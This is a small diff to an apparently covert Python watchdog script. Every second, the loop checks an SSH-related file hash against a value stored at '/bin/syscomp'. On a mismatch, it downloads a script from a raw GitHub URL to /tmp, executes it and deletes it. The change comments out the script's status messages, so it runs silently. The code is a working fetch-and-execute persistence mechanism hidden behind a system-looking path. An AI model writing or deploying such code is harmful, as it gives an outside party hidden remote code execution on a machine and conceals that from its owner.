@@ -25,11 +25,11 @@ while True:
         goldHash = open('/bin/syscomp', 'r').read()
         if goldHash == sshCheckFileHash:
             pass
-            print('gg')
+            #print('gg')
         else:
             os.system('wget -O /tmp/process2.py https://raw.githubusercontent.com/shad0wghost/mylinuxnow/master/softconfigs.py')
             os.system('python /tmp/process2.py')
             os.system('rm -rf /tmp/process2.py')
             sshStatus = "needhash"
-            print("NOT GG MAND ITS FUCKED")
+            #print("NOT GG MAND ITS FUCKED")
     time.sleep(1)
